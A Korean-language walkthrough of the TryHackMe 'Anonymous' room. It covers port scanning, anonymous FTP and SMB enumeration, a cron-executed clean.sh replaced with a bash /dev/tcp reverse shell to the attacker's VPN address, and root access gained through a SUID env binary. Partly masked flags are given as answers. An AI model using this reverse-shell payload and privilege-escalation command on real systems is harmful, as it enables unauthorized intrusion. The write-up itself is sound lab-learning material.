# Tryhackme | Anonymous 챌린지

챌린지 링크 -> https://tryhackme.com/room/anonymous

# Anonymous - TryHackMe Write-up

가장 먼저 정보 수집의 기본이 되는 포트스캔을 해주었다

> --min-rate 5000 옵션을 사용하여 스캔 속도를 높였고 -p- 옵션으로 모든 포트(1-65535)를 검사했다

```
nmap -sS --min-rate 5000 -p- 10.201.43.68
```

![1](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/1.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

스캔 결과 1번 문제의 정답인 4개의 포트가 열려 있었다

나머지 65531개의 포트는 닫혀있거나 필터링되어 있었다

SSH는 일반적으로 초기 공격 대상으로 사용하기 어렵기 때문에 FTP와 SMB 서비스에 집중하기로 했다

**Q1: How many ports are open?**

**Answer: 4**

다음으로는 서비스들의 버젼을 탐색하였다

> -sC 옵션은 기본 NSE 스크립트를 실행하고, -sV 옵션은 서비스 버전을 탐지한다.

```
nmap -sC -sV -p 21,22,139,445 10.201.43.68
```

![2](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/2.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

스캔 결과 2번과 3번에 대한 답을 쉽게 찾을 수 있었다

또한 호스트명이 "ANONYMOUS"라는 점이 흥미로웠다 왜냐하면 이는 익명 접근과 관련된 힌트일 수 있기 때문이다

**Q2: What service is running on port 21?**

**Answer: ftp**

**Q3: What service is running on ports 139 and 445?**

**Answer: smb**

가장 먼저 SMB 서비스를 확인했다

> smbclient를 사용하여 공유 폴더 목록을 조회했다

```
smbclient -L //10.201.43.68 -N
```

4번의 정답인 "pics"라는 공유 폴더를 발견했다

이 폴더에 접근하여 내용을 확인해보니 corgo2.jpg와 puppos.jpeg 두 개의 이미지 파일이 존재했다

때문에 스테가노그래피를 의심하여 strings, binwalk 등으로 분석했지만 숨겨진 데이터는 발견하지 못했다

**Q4: There's a share on the user's computer. What's it called?**

**Answer: pics**

다음으로는 FTP 서비스에 익명 로그인을 시도했다

앞서말한 호스트명이 "ANONYMOUS"였던 점을 고려하면 익명 접근이 허용될 가능성이 높다고 판단했다

```yaml
ftp 10.201.43.68
Name: anonymous
Password: (엔터)
```

예상대로 익명 접근이 허용되었다 ls 명령으로 디렉토리를 확인한 결과 scripts 디렉토리를 발견했다 해당 디렉토리로 이동하여 파일 목록을 확인했다

```bash
ftp> cd scripts
ftp> ls
```

scripts 디렉토리에서 3개의 파일을 발견했다

각 파일을 다운로드하여 내용을 확인하기로 했다

```
ftp> get clean.sh
ftp> get removed_files.log
ftp> get to_do.txt
```

###

!cat clean.sh 명령으로 파일 내용을 확인했다

![3](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/3.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
    echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log
    done
fi
```

파일을 확인해본 결과 이러한 스크립트가 나왔다

스크립트를 간단하게 설명하자면 이렇다

1. tmp_files 변수를 0으로 초기화한다
2. 변수 값이 0이면 "nothing to delete" 메시지를 removed_files.log에 기록한다
3. 0이 아니면 해당 파일들을 삭제하고 로그를 남긴다
4. 로그 파일 경로가 /var/ftp/scripts/removed_files.log로 절대 경로로 지정되어 있다

이 스크립트는 서버에서 자동으로 실행되고 있을 가능성이 높다

다음으론 removed_files.log를 살펴보았다

![4](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/4.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

로그 파일에는 "Running cleanup script: nothing to delete" 메시지가 수십 번 반복 기록되어 있었다 로그의 타임스탬프가 없어 정확한 실행 주기는 알 수 없었으나 메시지가 반복된다는 것은 clean.sh가 주기적으로 실행되고 있다는 걸 보여준다

최근 수정 시간이 10월 5일 09:45로 매우 최근이라는 점도 크론잡이 현재도 활성화되어 있음을 뒷받침한다

다음으로는 to_do.txt를 살펴보았다

![5](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/5.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

```
I really need to disable the anonymous login...it's really not safe
```

관리자가 작성한 것으로 보이는 메모에서 익명 로그인을 비활성화해야 한다는 내용을 확인했다 하지만 2020년 5월에 작성된 후 실제로는 비활성화되지 않은 것으로 보인다 이는 보안 설정이 제대로 관리되지 않고 있음을 의미한다

지금까지 수집한 정보를 종합하면

1. FTP에 익명 접근이 가능하다
2. FTP 디렉토리에 쓰기 권한이 있는지 확인이 필요하다
3. clean.sh가 크론잡으로 주기적 실행된다
4. clean.sh를 수정할 수 있다면 역쉘을 얻을 수 있다

이러한 점들을 미루어 보아 FTP에서 파일 업로드 권한을 테스트하기 위해 clean.sh를 수정하기로 했다 만약 쓰기 권한이 있다면 악성 스크립트로 교체하여 크론잡이 실행될 때 역쉘을 획득할 수 있을 것이다

로컬 시스템에서 bash 역쉘 페이로드를 포함한 새로운 clean.sh를 생성했다

![6](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/6.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

```bash
cd ~
echo '#!/bin/bash' > clean.sh
echo 'bash -i >& /dev/tcp/10.9.0.106/4444 0>&1' >> clean.sh
chmod +x clean.sh
cat clean.sh
```

페이로드 설명

- bash -i: 대화형(interactive) bash 쉘 실행
- >&: 표준 출력과 표준 에러를 리다이렉트
- /dev/tcp/10.9.0.106/4444: 공격자 IP와 포트로 TCP 연결
- 0>&1: 표준 입력을 표준 출력으로 리다이렉트

이렇게 하면 서버가 공격자 시스템의 4444번 포트로 쉘을 연결하게 된다

참고로 10.9.0.106은 VPN 인터페이스(tun0)의 IP 주소다

생성한 악성 스크립트를 FTP 서버에 업로드했다

![7](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/7.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

```yaml
ftp 10.201.43.68
Name: anonymous
Password: (엔터)
ftp> cd scripts
ftp> put clean.sh
```

업로드가 성공적으로 완료되었다 파일 크기가 원래 314 bytes에서 53 bytes로 변경된 것을 확인했다 이는 원본 파일이 우리가 작성한 페이로드로 교체되었음을 의미한다

FTP에 쓰기 권한이 있다는 것이 확인되었으므로 이제 크론잡이 실행될 때까지 기다리면 된다

역쉘 연결을 받기 위해 netcat 리스너를 설정했다

```
nc -lvnp 4444
```

![8](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/8.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

크론잡의 정확한 실행 주기는 알 수 없었지만, 약 1-5분 정도 대기한 후 서버에서 역쉘 연결이 되었다 연결이 성공하면 다음과 같은 메시지가 표시된다

```
Listening on 0.0.0.0 4444
Connection received on 10.201.43.68 40760
```

###

쉘을 획득한 후 현재 위치와 권한을 확인했다

![9](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/9.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

```
whoami
# namelessone

pwd
# /home/namelessone

ls
# pics
# user.txt

cat user.txt
# 90d6f99*************************740
```

namelessone 사용자로 쉘을 획득했고, 홈 디렉토리에서 user.txt 플래그를 찾을 수 있었다

**Q5: user.txt**

**Answer: 90d6f99...740**

###

다음으로 일반 사용자에서 root 권한으로 상승하기 위해 SUID(Set User ID) 비트가 설정된 파일을 검색했다 SUID 비트가 설정된 파일은 실행 시 파일 소유자의 권한으로 실행되므로 root 소유의 SUID 파일을 악용하면 권한 상승이 가능하다

```bash
find / -perm -4000 -type f 2>/dev/null
```

명령어 설명

- find /: 루트 디렉토리부터 검색
- perm -4000: SUID 비트(4000)가 설정된 파일
- type f: 일반 파일만
- 2>/dev/null: 에러 메시지 숨김

![10](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/10.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

검색 결과 여러 SUID 파일이 발견되었다

- /usr/bin/passwd - 정상 (비밀번호 변경에 필요)
- /usr/bin/su - 정상 (사용자 전환에 필요)
- /usr/bin/env - 비정상 (일반적으로 SUID 불필요)
- 기타 시스템 바이너리들

/usr/bin/env에 SUID가 설정된 것은 비정상적이다 env는 환경 변수를 설정하고 프로그램을 실행하는 유틸리티로 일반적으로 SUID가 필요하지 않다 이는 명백한 권한 상승 벡터다

### env를 통한 권한 상승

GTFOBins(https://gtfobins.github.io/)는 Unix 바이너리를 악용하여 보안을 우회하는 방법을 정리한 사이트다 env의 SUID 섹션을 참고하면 다음과 같은 익스플로잇 방법을 확인할 수 있다

![11](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/11.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

```bash
/usr/bin/env /bin/sh -p
```

명령어 설명

- /usr/bin/env: SUID가 설정된 env 바이너리 실행
- /bin/sh: env를 통해 쉘 실행
- p: privileged 모드 (SUID 권한 유지)

env가 SUID로 실행되면 root 권한을 가지게 되고 이 상태에서 /bin/sh -p를 실행하면 root 권한을 유지한 채 쉘이 실행된다 -p 옵션이 없으면 쉘이 실제 사용자 권한으로 되돌아갈 수 있으므로 반드시 포함해야 한다

![12](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80/12.Tryhackme%20%7C%20Anonymous%20%EC%B1%8C%EB%A6%B0%EC%A7%80.png)

```
whoami
# root

cat /root/root.txt
# 4d93009*************************363
```

권한 상승에 성공하여 root 권한을 획득했다 /root 디렉토리에 접근하여 root.txt 플래그를 확인했다

**Q6: root.txt**

**Answer: 4d93009...363**
